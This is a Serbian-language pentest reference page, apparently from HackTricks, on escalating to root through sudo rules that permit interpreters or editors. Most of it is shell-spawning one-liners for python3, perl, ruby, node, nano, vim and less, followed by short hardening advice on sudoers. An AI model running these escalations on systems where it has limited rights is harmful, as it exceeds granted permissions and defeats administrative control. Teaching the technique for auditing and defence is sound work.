# Zloupotreba Sudo komandi

{{#include ../../banners/hacktricks-training.md}}

## Interpreteri dozvoljeni preko Sudo-a

Ako `sudo -l` dozvoljava korisniku da pokrene interpreter kao root, tretirajte to kao direktno izvršavanje koda. Interpreteri su dizajnirani za izvršavanje proizvoljnog koda, pa je pravilo koje dozvoljava `python3`, `perl`, `ruby`, `lua`, `node` ili slične binarne fajlove obično ekvivalentno izvršavanju komandi kao root, osim ako su argumenti strogo ograničeni i validirani.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Uobičajeni tok provere: prvo izlistajte privilegije korisnika, a zatim izvršite Python naredbu pomoću interpreterove opcije `-c`.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Drugi primeri interpreter-a prikazani su u nastavku; navedeni interpreter-i dokumentuju izvršavanje inline-code-a ili API-je za child-process.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Tačna putanja je važna. Ako sudo pravilo dozvoljava `/usr/bin/python3`, koristite tu tačnu putanju tokom provere.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editori dozvoljeni preko sudo

Ako `sudo -l` dozvoljava korisniku da pokrene interaktivni editor kao root, tretirajte to kao površinu za izvršavanje komandi, a ne kao bezopasnu dozvolu za uređivanje datoteka. Editori često mogu da izvršavaju shell komande, čitaju proizvoljne datoteke, upisuju proizvoljne datoteke ili pozivaju spoljne pomoćne programe iz samog editora.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Uobičajeni tok provere: izlistajte privilegije korisnika, a zatim pokrenite svaki dozvoljeni editor ili pager preko sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Izvršavanje komandi pomoću `nano`

Kada je `nano` dozvoljen putem sudo-a, izvršavanje komandi može biti dostupno iz interfejsa editora.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Zatim unesite naredbu kao što je `id` ili `/bin/sh` u prompt naredbe nano.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Ako interaktivni shell nema upotrebljive terminalne tokove, ovaj oblik preusmeravanja mapira njegov standardni izlaz i grešku na deskriptor 0.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
Tačan redosled tastera može da se razlikuje u zavisnosti od verzije programa nano i opcija build-a, ali bezbednosni problem je isti: editor se izvršava kao root i može da poziva eksterne komande.<sup>[[1]](#references)[[12]](#references)</sup>

### Drugi uobičajeni izlazi iz editora

Editor-i u Vim stilu obično omogućavaju izvršavanje komandi putem `:!`.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
Pageri kao što je `less` takođe mogu omogućiti izvršavanje shell-a.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Defanzivne napomene

- Izbegavajte dodeljivanje interpretera ili interaktivnih editora putem sudo.<sup>[[1]](#references)</sup>
- Prednost dajte fiksnim wrapper-ima u vlasništvu korisnika root koji izvršavaju jednu usko definisanu administratorsku radnju.<sup>[[1]](#references)[[2]](#references)</sup>
- Ako je interpreter neizbežan, ograničite tačnu putanju skripte i sprečite argumente pod kontrolom korisnika, upisive import-e, `PYTHONPATH` i nebezbedno očuvanje okruženja.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Ako je potrebno uređivanje fajla, ograničite tačnu putanju fajla i razmotrite `sudoedit` sa zakrpljenim verzijama sudo i strogim rukovanjem okruženjem.<sup>[[1]](#references)[[2]](#references)</sup>
- Proverite `SETENV`, `env_keep`, upisive radne direktorijume, upisive putanje modula/import-a, `NOEXEC`, `use_pty` i logging, ali ih nemojte smatrati potpunim sandbox-om.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Linux stranica priručnika](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Komandna linija i okruženje — Python dokumentacija](https://docs.python.org/3/using/cmdline.html)
- [4] [os — Različiti interfejsi operativnog sistema — Python dokumentacija](https://docs.python.org/3/library/os.html)
- [5] [perlrun — kako izvršiti Perl interpreter](https://perldoc.perl.org/perlrun)
- [6] [exec — Perl dokumentacija](https://perldoc.perl.org/functions/exec)
- [7] [Ruby opcije komandne linije](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Ruby dokumentacija](https://ruby-doc.org/3.4/Kernel.html)
- [9] [API komandne linije — Node.js dokumentacija](https://nodejs.org/api/cli.html)
- [10] [Child process — Node.js dokumentacija](https://nodejs.org/api/child_process.html)
- [11] [Lua 5.4 lua stranica priručnika](https://www.lua.org/manual/5.4/lua.html)
- [12] [Tekstualni editor GNU nano](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Linux stranica priručnika](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Preusmeravanja — Bash referentni priručnik](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
